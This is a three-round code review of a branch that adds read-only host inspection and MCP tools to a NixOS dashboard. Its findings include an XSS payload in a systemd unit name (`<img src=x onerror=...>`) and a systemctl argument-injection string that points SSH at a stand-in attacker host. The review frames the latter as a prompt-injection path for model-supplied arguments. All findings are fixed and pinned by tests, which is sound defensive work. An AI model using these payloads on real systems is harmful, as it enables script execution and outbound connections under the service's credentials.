# Review: expand read-only host inspection beyond stats

- TASK: 20260729-125024
- BRANCH: feat/host-inspection

## Round 1 - REQUEST_CHANGES

- VERDICT: REQUEST_CHANGES

Out-of-context reviewer against `git diff master...HEAD` at 45a8a63. 14 findings
(3 MAJOR, 8 MINOR, 3 NIT). All 14 addressed; every MAJOR carries a regression
test, and two of the three were verified by reverting the fix and watching the
new test fail.

The reviewer's framing was right and worth recording: the package's structure
(runner seam, availability-on-the-model, fixture-driven parsers) does deliver
its central claim, and every failure below is at an EDGE of that claim - a place
where the discipline was not carried across a layer boundary. Two of the three
MAJORs are exactly that: the honesty rule not carried into the renderer's branch
order, and the escaping rule not carried into the new frontend.

### MAJOR 1 - Stored XSS: host strings into `innerHTML` unescaped

`web/src/stats-view.ts`, seven sites. `card()` and `row()` take HTML strings;
every pre-existing caller escapes host-derived values first and none of the new
host-card code did. Reachable: the overview polls the USER scope, and a systemd
unit is named by a file, so anything in `~/.config/systemd/user/` could name
itself `<img src=x onerror=...>.service` and run script in the authenticated
operator's dashboard. The reviewer confirmed it with a jsdom probe.

This repeats `escape-only-host-strings-in-element-content` (LESSONS.md) verbatim,
including the part prescribing the hostile-input test that was not written.

**Fixed** structurally rather than with seven `escapeHtml` calls: added
`hostCard`/`hostRow`/`hostValue`, which build nodes and assign `textContent`.
There is no escaping to forget because there is no HTML sink. Nearly every string
on these cards comes from the machine, so the safe form is the right default for
anything added later. Pinned by five hostile-input jsdom tests covering unit
names, mountpoints, sensor labels, generation dates and availability reasons.
**Verified by reverting `hostRow` to the `innerHTML` form: 2 of the 5 fail.**

### MAJOR 2 - A journal read that discarded everything rendered as "empty"

`journal.py` decrements the byte budget before appending the first entry, so a
single message larger than `MAX_JOURNAL_BYTES` left `entries == []` with
`truncated=True`. `render_journal` checked the empty case FIRST and printed "the
window is empty, not broken" about data it had read and thrown away - the
package's own central failure, in the module whose docstring names oversized
lines as the motivating case. The existing byte-cap test used 10x20 KB lines, so
it always kept at least one entry and never reached this.

**Fixed** twice over: the oversized entry is now KEPT and clipped
(`...[message cut to fit]`) rather than dropped, and the renderer checks
truncation before the empty branch and says `NOT EMPTY:` explicitly. Two
regression tests, one driving the parser and one pinning the renderer directly
against a zero-entry truncated report.

### MAJOR 3 - Argument injection: model strings became `systemctl` options

`argv` + `shell=False` stops shell injection, not OPTION injection: there was no
`--` separator, so a model-supplied unit pattern or name beginning with `-` was
parsed as a flag. Verified live on this host:

```
$ systemctl ... -o json '-Hnope@no-such-host.invalid'
ssh: Could not resolve hostname no-such-host.invalid
```

So `host_units(pattern="-Hattacker@evil.example.com")` makes the host open an
outbound SSH connection, with the service user's credentials, to a model-chosen
destination. Since these arguments can come from text the model just read (a
journal line, a unit description), this is a prompt-injection path in a package
whose premise is "safe because read-only". The most serious finding of the round.

**Fixed**: every positional in the package is now passed after `--`
(`systemctl`, `du`, `nix store diff-closures`) - verified live that the `--` form
treats the same string as an operand where the bare form parsed it as a flag.
The systemctl positionals (unit name, unit pattern), which are the ones a model
supplies freely, additionally go through `rejects_option()`, which refuses a
leading `-` with an explicit reason before anything runs. Regression tests assert
both the refusal and that NOTHING ran, at the library and the MCP tool boundary.

Round 2 corrected an overclaim in this section's first draft: it is NOT true that
every positional is both screened and separated. `du`'s root is separated and
gated by `is_dir()`; `diff-closures`' arguments are separated and validated
against the store-path/generation forms (MINOR 4). Those are different, and
arguably stronger, validations - but the blanket claim was wrong and is corrected
here rather than left standing. Round 2 also audited the argv paths this section
does not mention and confirmed none was missed: `journalctl`'s `-u`/`-p`/
`--since`/`--until` values are option ARGUMENTS, consumed by getopt regardless of
a leading `-`, and the remaining call sites take no caller data at all.

### MINOR 4 - `closure_diff` passed an unvalidated string to `nix` as an installable

`nix store diff-closures` takes installables, so `closure_diff(r, "nixpkgs#firefox", ...)`
would make a read-only inspection fetch and realise a derivation. Not reachable
through the MCP tool (typed `int`), but `HostInspector.closure_diff` is public
API, so the guarantee rested on a caller's discipline rather than on the layer
claiming it. **Fixed**: `resolve()` accepts a generation number or an existing
`/nix/store/` path, and refuses anything else with a reason. Tested.

### MINOR 5 - A truncated failed-unit count presented as complete

`failed_units()` caps at 50 and sets `truncated`; the card rendered the length as
the authoritative number, so 60 failed units displayed as "50 failed".
`UnitList.truncated` was declared in `common.ts` and never read. Same class of
error as the one the card's own comment already defended against. **Fixed**:
renders `50+` with a "lower bound" note. Tested.

### MINOR 6 - A failing host poll left stale cards with no indication

`refreshHost` errors went to `console.error` only, so after one good poll every
later failure left the previous snapshot rendered as if current. For a section
whose contract is "a blank card reads as all-fine", indefinitely stale cards are
the same lie in a different shape. **Fixed**: `markHostCardsStale` adds an error
note, cleared by the next successful render and not stacked per failure. Tested,
including the clearing and the no-stacking behaviour.

### MINOR 7 - Journal truncation under-reported when a line failed to parse

Unparsed lines `continue` without consuming the cap, so with `capped+1` raw lines
and one bad line the loop ended at exactly `capped` entries with
`truncated=False` - a full page presented as the complete set. **Fixed**:
truncation is also derived from `total_seen > capped`, which `-n capped+1` makes
authoritative. The regression test needed the garbage line FIRST; with it last
the cap is reached before it is read, which is why the first draft of the test
did not reproduce.

### MINOR 8 - The TTL test did not test TTL expiry

`ttl_seconds=0.0` makes `now - collected_at < 0` never true, so the test
exercised the never-cache path and **would have passed against an implementation
with no cache at all** - the exact failure a test with that name must exclude.
**Fixed**: the clock is injected, and the test asserts both halves - served from
cache just before expiry, re-collected just after. A second test pins the new TTL
floor.

### MINOR 9 - Three conditional or vacuous tests

- The firewall assertion sat behind `if "unavailable" not in out`, so it vanished
  silently on any degraded host. Now driven through a fixture system tree,
  unconditional.
- `assert "unavailable" in out or "closure diff" in out or "fewer than two" in out`
  was a tautology (every render path emits the title) and asserted nothing about
  the "previous -> current" behaviour its name claimed. Now spies the runner and
  asserts the argv named generations 190 and 191 in that order, and not 12.
- `assert thermal.temperatures or not thermal.ok` inside the DoD sensor proof
  passes with zero data on a sensorless host. Now driven against a fixture sysfs
  tree with asserted counter values.

### MINOR 10 - `--delete-older-than` made read-only-ness depend on nix

`nix-collect-garbage --delete-older-than Nd` is documented as equivalent to
`nix-env --delete-generations` per profile - a mutating half distinct from the
store GC that `--dry-run` covers. This was the one place where a package
advertising "no write path" depended on ANOTHER program's promise rather than on
the command chosen. **Fixed** by removing the parameter entirely and switching to
`nix-store --gc --print-dead`, which only enumerates. Verified live: 8458 dead
paths reported, nothing deleted. The test asserts no deleting argument can reach
nix, not merely that `--dry-run` was present.

### MINOR 11 - The cache held a mutex across the collection inside `to_thread`

Concurrent requests each occupied a default-executor thread blocked on a
`threading.Lock`, so a slow `nixos-rebuild` could starve the executor the rest of
the app shares. Single-flight was the right intent, blocking N executor threads
was not. **Fixed**: an `asyncio.Lock` at the route (a waiting request suspends on
the loop), with the collection still in `to_thread` and a re-check inside the
lock. Also noted: `SCUFRIS_HOST_OVERVIEW_SECONDS=0` disabled caching entirely -
now floored at `MIN_HOST_OVERVIEW_TTL`, since "uncached" is never a sensible
configuration for a subprocess-backed endpoint.

### NIT 12, 13, 14

Non-ASCII in `packages.py` (the empty-set glyph in a comment quoting nix's
output - the global style rule has no exemption for quotation); a leftover
`"literal".lower()` in a test; `critical if self.critical else self.high`
treating a legitimate `0.0` as unset. All fixed.

### What the reviewer checked and found sound

`/api/host/overview` is correctly covered by the deny-by-default middleware (the
route-enumerating test in `test_auth.py` picks it up without modification); no
write path exists in the package apart from the MINOR 10 caveat now removed;
`run_command` leaks no processes; and the closure-diff trap, the "no failed
units" wording, the declared-vs-live firewall labelling, the package-vs-core
throttle distinction and the "count is not a size" refusal are all correctly
implemented AND tested with assertions that fail against a broken implementation.

## Round 2 - REQUEST_CHANGES

- VERDICT: REQUEST_CHANGES

An independent reviewer verified each round-1 fix at the code rather than from
the prose above, hunted for defects introduced BY the fixes, and re-ran both
gates. Verdict: all 14 findings genuinely fixed, none of the risky rewrites
(journal clipping, truncation derivation, the `asyncio.Lock`/`fresh()` split,
`resolve()`) introduced a defect - but two new items, one of them a behavioural
regression caused by a round-1 fix.

### R2 MINOR 1 - the MINOR 10 fix reintroduced empty-vs-broken

Switching to `nix-store --gc --print-dead` was right, but the parser kept the
summary-line shape that `nix-collect-garbage` printed and treated "no output" as
unrecognised. Measured on this host: `--print-dead` writes bare store paths,
**no summary line at all**, and the word "deleting" never appears (so the guard
clause was dead code). A freshly collected store therefore prints nothing, and
the report would have said "no dead-path count was reported" for the healthiest
possible result. That is this package's own central failure, reintroduced by a
fix for a different finding - the sharpest lesson of the round.

**Fixed**: classify every stdout line; an all-store-path listing (including an
EMPTY one) is a count, a listing with unclassifiable lines is explicitly unknown,
and the summary-line shape is accepted only where it actually appears. Three
tests: the empty case, a 2048-path listing, and unclassifiable output.

### R2 MINOR 2 - a vacuous assertion left behind by the same fix

`assert "nix-collect-garbage" not in invoked` can no longer fail, because nothing
invokes that command any more - the exact class round 1 flagged in MINOR 9.
**Fixed** to assert on `--print-dead`, the argument the store walk now uses, and
the dead fixture key was removed.

### R2 NITs, all applied

- The TTL test monkeypatched `scufris.app.time.monotonic`, mutating the stdlib
  module - so "the clock is injected" was not what the code did. `_HostOverviewCache`
  now takes a `clock` argument and the test passes one.
- The journal clip sliced by CHARACTERS while the budget counts BYTES, so a
  multi-byte message could retain several times the budget. Now cut on the
  encoded bytes.
- `resolve()` rejected the profile-link form it itself produces for an int. Now
  accepts both.
- "ONLY enumerates" was slightly absolute: the walk takes the global GC lock
  (blocking concurrent `nix build`) and prunes stale temproots. No store path is
  removed, so the guarantee stands, but the cost is now stated.
- A stale test docstring referring to the removed `--dry-run`.
- `/api/config` published the unfloored interval while the server floored its
  cache, so the two disagreed about the cadence. Now serves the floored value.

## Round 3 - APPROVE

- VERDICT: APPROVE

All round-1 and round-2 findings addressed. Gates green on the updated branch:

- `nix flake check` (ruff + mypy + pytest + records): pass, and `nix build
  .#scufris .#web` alongside it, since flake check only EVALUATES packages.
  Both confirmed by EXIT CODE, not by reading a piped tail - piping through
  `tail` reports tail's status, which had me read one earlier run as green when
  a test was failing (`nix-develop-pytest-pipe-eats-the-summary`).
- `cd web && npm run ci` (prettier + eslint + vitest + build): pass
- `examples/host_inspect.py` re-run against the real host, including `--slow`
  (8458 dead paths reported through the new enumerating command)

One further defect surfaced only in the nix build SANDBOX, which has no
`/sys/class/power_supply` at all: the DoD test asserted `thermal.battery.ok`,
but an absent sysfs interface legitimately degrades to unavailable-with-a-reason
rather than to present=False-with-a-caveat. Both are correct answers, and the
test was asserting the environment rather than the property. It now asserts what
actually matters - that the report carries a message either way and is never
silently blank - which holds in both environments and would still fail against a
bare empty report.

Four fixes were verified by reverting them and watching the new test go red: the
XSS pin (2 of 5 hostile-input tests fail against the `innerHTML` form), the
store-path regex, the firewall dedup, and the empty-store count. The rest are
covered by tests written against reproduced behaviour, and round 2 independently
spot-checked that the new pins fail against the unfixed code.
